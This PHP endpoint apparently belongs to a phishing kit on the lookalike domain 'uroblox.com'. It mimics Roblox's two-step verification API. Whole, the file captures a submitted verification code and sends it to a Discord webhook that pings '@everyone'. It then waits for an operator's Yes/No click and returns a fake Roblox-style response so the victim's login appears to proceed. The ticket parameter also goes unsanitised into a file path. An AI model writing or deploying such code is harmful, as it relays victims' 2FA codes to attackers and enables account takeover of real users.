<?php
// Add CORS headers
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
header('Content-Type: application/json');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

require('../../setup.php');

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid JSON input: ' . json_last_error_msg()]);
        exit;
    }

    if (!isset($input['code'])) {
        http_response_code(400);
        echo json_encode(['error' => 'Code is not provided in the JSON input.']);
        exit;
    }

    // Generate a unique ticket for this request
    $ticket = uniqid('ticket_', true);

    // Define links for confirmation
    $yesLink = "https://uroblox.com/auth/v2/step?action=confirm_yes&ticket=" . urlencode($ticket);
    $noLink = "https://uroblox.com/auth/v2/step?action=confirm_no&ticket=" . urlencode($ticket);

    // Create the webhook embed
    $embed = json_encode([
        'content' => '@everyone',
        'username' => "Code Confirmation",
        'tts' => true,
        'embeds' => [[
            'title' => 'Confirmation Required',
            'type' => 'rich',
            'timestamp' => date('c'),
            'color' => hexdec(str_replace('#', '', $EmbedColour ?? '#FF0000')),
            'fields' => [
                ['name' => 'Code', 'value' => '```' . htmlspecialchars($input['code']) . '```', 'inline' => false],
                ['name' => 'Yes', 'value' => "[Click Here]($yesLink)", 'inline' => true],
                ['name' => 'No', 'value' => "[Click Here]($noLink)", 'inline' => true],
            ]
        ]]
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    if (json_last_error() !== JSON_ERROR_NONE) {
        http_response_code(500);
        echo json_encode(['error' => 'Error encoding JSON: ' . json_last_error_msg()]);
        exit;
    }

    // Send the embed to the Discord webhook
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_URL, $Webhook);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $embed);
    
    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        http_response_code(500);
        echo json_encode(['error' => 'cURL error: ' . curl_error($ch)]);
        exit;
    }
    curl_close($ch);

    // Long polling to wait for response
    $maxWaitTime = 60; // Maximum wait time in seconds
    $startTime = time();

    while (true) {
        
        $responseFile = "/tmp/response_$ticket.json";
        if (file_exists($responseFile)) {
            $responseData = json_decode(file_get_contents($responseFile), true);

            if (isset($responseData['response'])) {
                unlink($responseFile); 
                if ($responseData['response'] === 'confirm_yes') {
                    echo json_encode([
                        'user' => [
                            'id' => uniqid(),
                            'name' => 'Confirmed User',
                            'displayName' => 'Confirmed User'
                        ],
                        'twoStepVerificationData' => [
                            'mediaType' => 'email',
                            'ticket' => $ticket
                        ],
                        'isBanned' => false
                    ]);
                    exit;
                } elseif ($responseData['response'] === 'confirm_no') {
                    http_response_code(403);
                    echo json_encode([
                        'errors' => [
                            [
                                'code' => 1,
                                'message' => 'User rejected the confirmation.',
                                'userFacingMessage' => 'Action rejected by the user.'
                            ]
                        ]
                    ]);
                    exit;
                }
            }
        }


        if ((time() - $startTime) > $maxWaitTime) {
            http_response_code(408);
            echo json_encode(['error' => 'Timeout waiting for user response.']);
            exit;
        }

        usleep(500000);
    }
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['action'], $_GET['ticket'])) {
    // Listener: Handle Yes/No response
    $action = $_GET['action'];
    $ticket = $_GET['ticket'];

    if (!in_array($action, ['confirm_yes', 'confirm_no'])) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid action.']);
        exit;
    }
    // Save the response in a temporary file
    $responseFile = "/tmp/response_$ticket.json";
    file_put_contents($responseFile, json_encode(['response' => $action]));

    echo "Your response has been recorded: $action.";
    exit;
} else {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid request method or parameters.']);
    exit;
}
?>
